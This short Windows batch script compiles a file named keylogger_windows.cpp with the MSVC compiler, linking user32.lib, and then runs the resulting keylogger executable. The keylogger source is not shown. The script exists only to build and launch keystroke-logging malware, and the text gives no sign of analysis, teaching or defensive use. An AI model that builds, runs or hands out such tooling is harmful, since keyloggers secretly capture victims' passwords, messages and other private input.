@echo off
REM Build and run script for Windows

REM Compile the Windows keylogger
cl /EHsc keylogger_windows.cpp /I..\include user32.lib

REM Run the keylogger
keylogger_windows.exe
